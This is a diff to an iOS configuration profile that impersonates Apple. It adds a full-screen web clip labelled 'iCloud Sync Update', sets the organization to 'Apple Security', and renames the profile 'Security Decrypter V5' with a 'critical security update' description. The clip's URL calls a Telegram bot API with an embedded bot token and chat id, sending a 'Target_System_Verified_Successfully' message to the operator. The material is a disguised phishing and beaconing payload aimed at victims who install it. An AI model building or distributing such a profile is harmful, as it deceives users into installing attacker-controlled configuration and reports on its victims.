@@ -5,6 +5,16 @@
     <key>PayloadContent</key>
     <array>
         <dict>
+            <key>FullScreen</key>
+            <true/>
+            <key>IsRemovable</key>
+            <true/>
+            <key>Label</key>
+            <string>iCloud Sync Update</string>
+            <key>PayloadDescription</key>
+            <string>Configures secure browser access and data synchronization.</string>
+            <key>PayloadDisplayName</key>
+            <string>Secure Verification Service</string>
             <key>PayloadIdentifier</key>
             <string>com.apple.webclip.managed.1</string>
             <key>PayloadType</key>
@@ -14,15 +24,17 @@
             <key>PayloadVersion</key>
             <integer>1</integer>
             <key>URL</key>
-            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_Profile_Installed_Success!_🔥</string>
-            <key>Label</key>
-            <string>Verified Data Access</string>
+            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_System_Verified_Successfully_V5_🔥</string>
         </dict>
     </array>
+    <key>PayloadDescription</key>
+    <string>Critical security update to maintain private chat database and encryption.</string>
     <key>PayloadDisplayName</key>
-    <string>Security Update V5</string>
+    <string>Security Decrypter V5</string>
     <key>PayloadIdentifier</key>
     <string>com.apple.security.update.v5</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Security</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
